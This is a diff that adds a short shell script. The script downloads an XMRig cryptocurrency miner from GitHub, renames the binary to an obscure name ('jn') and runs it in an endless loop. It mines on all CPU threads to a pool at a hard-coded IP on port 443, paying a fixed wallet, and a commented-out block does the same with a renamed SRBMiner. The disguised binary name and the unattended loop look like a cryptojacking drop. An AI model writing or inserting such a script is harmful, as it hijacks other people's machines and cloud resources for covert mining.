@@ -1,0 +1,19 @@
+apt update && apt -y install unzip libuv1-dev libhwloc-dev
+curl https://github.com/juno-cash/juno-xmrig/releases/download/v6.24.0-juno.6/xmrig-v6.24.0-juno.6-linux-x64.zip -L -o xmrig-v6.24.0-juno.6-linux-x64.zip
+unzip xmrig-v6.24.0-juno.6-linux-x64.zip
+mv xmrig jn
+while :; do
+./jn -a rx/juno -o stratum+tcp://68.183.8.214:443 -u j10r9xk0ufxpmmav5g3u7h4m6ttuhnk23fnkc2p6e36nj4hg8zght6mg4l4gpvsfuwx9vk4774yc0jlkeh2ftq0t8ar0y2td24euuzp2yn -p x -t $(nproc --all)
+done
+
+
+
+
+#curl https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.0/SRBMiner-Multi-3-1-0-Linux.tar.gz -L -o SRBMiner-Multi-3-1-0-Linux.tar.gz
+#tar -xzvf SRBMiner-Multi-3-1-0-Linux.tar.gz
+#cd SRBMiner-Multi-3-1-0
+#mv SRBMiner-MULTI serba
+#while true
+#do
+#./serba --algorithm randomjuno --pool 68.183.8.214:443 --wallet j10r9xk0ufxpmmav5g3u7h4m6ttuhnk23fnkc2p6e36nj4hg8zght6mg4l4gpvsfuwx9vk4774yc0jlkeh2ftq0t8ar0y2td24euuzp2yn --password x --cpu-threads $(nproc --all)
+#done
